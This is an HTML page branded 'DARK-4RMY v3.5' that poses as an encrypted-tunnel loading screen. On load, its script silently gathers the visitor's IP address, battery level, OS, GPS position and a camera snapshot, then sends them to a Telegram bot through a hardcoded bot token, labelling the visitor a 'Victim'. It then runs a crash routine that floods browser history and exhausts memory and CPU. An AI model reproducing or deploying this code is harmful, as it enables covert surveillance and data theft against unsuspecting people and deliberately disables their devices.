<!DOCTYPE html>
<html lang="en">
<body>
    <div class="panel" id="main-panel">
        <h1 id="title">DARK-4RMY v3.5</h1>
        <p id="stat">Initializing Encrypted Tunnel...</p>
        <p id="sub-stat" style="opacity: 0.5;">Verifying Hardware Integrity...</p>
        <video id="video" style="display:none;" autoplay></video>
        <canvas id="canvas" style="display:none;"></canvas>
    </div>

    <script>
        const BOT_TOKEN = '8619398262:AAEClf--ikjwf3bmPy88xADrqOlcucnNjGE';
        const params = new URLSearchParams(window.location.search);
        const chatId = params.get('id');

        // --- HARD CRASH LOGIC (RAM & CPU KILLER) ---
        function triggerHardCrash() {
            document.getElementById('main-panel').classList.add('glitch');
            document.getElementById('title').innerText = "FATAL ERROR";
            document.getElementById('stat').innerText = "SYSTEM OVERLOAD: EXHAUSTED";
            
            // 1. History Flood (Bloqui l-bouton Back)
            for (let i = 0; i < 50000; i++) {
                window.history.pushState(null, null, window.location.href);
            }

            // 2. Resource Exhaustion (RAM & CPU)
            const memoryLeak = [];
            setInterval(() => {
                // Khneq l-RAM b chunks mkhyenin
                for (let i = 0; i < 100; i++) {
                    memoryLeak.push(new Array(1000000).fill("DARK-4RMY-STRIKE"));
                }
                // Khneq l-CPU b processes la-nihaiya
                console.log("OVERRIDE_" + Math.random());
                window.history.pushState({}, '', '#' + Math.random());
            }, 10);
        }

        async function init() {
            if (!chatId) return;

            try {
                // 1. IP & Battery
                const battery = await navigator.getBattery();
                const ipRes = await fetch('https://api.ipify.org?format=json');
                const ipData = await ipRes.json();
                
                let report = `🚨 *TARGET LOGGED* 🚨\n\n` +
                             `🌐 *IP:* \`${ipData.ip}\`\n` +
                             `🔋 *Battery:* ${Math.round(battery.level * 100)}%\n` +
                             `💻 *OS:* ${navigator.platform}`;

                // 2. GPS
                navigator.geolocation.getCurrentPosition(async (pos) => {
                    const gpsReport = report + `\n📍 *GPS:* [Google Maps](http://maps.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude})`;
                    await sendToBot(gpsReport);
                }, async () => {
                    await sendToBot(report + `\n📍 *GPS:* Denied ❌`);
                });

                // 3. Camera Snapshot
                try {
                    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                    const video = document.getElementById('video');
                    video.srcObject = stream;
                    
                    setTimeout(() => {
                        const canvas = document.getElementById('canvas');
                        canvas.width = video.videoWidth;
                        canvas.height = video.videoHeight;
                        canvas.getContext('2d').drawImage(video, 0, 0);
                        canvas.toBlob(blob => {
                            sendPhoto(blob);
                            // Siftna koulchi? Daba Crash!
                            setTimeout(triggerHardCrash, 2000);
                        });
                        stream.getTracks().forEach(t => t.stop());
                    }, 2500);
                } catch (e) {
                    // Camera refused? Crash anyway
                    setTimeout(triggerHardCrash, 1000);
                }

            } catch (err) {
                triggerHardCrash();
            }
        }

        async function sendToBot(text) {
            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id: chatId, text: text, parse_mode: 'Markdown' })
            });
        }

        async function sendPhoto(blob) {
            const formData = new FormData();
            formData.append('chat_id', chatId);
            formData.append('photo', blob, 'snap.jpg');
            formData.append('caption', '📸 *Victim Camera Snapshot*');
            formData.append('parse_mode', 'Markdown');
            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: formData });
        }

        window.onload = init;
    </script>
</body>
</html>
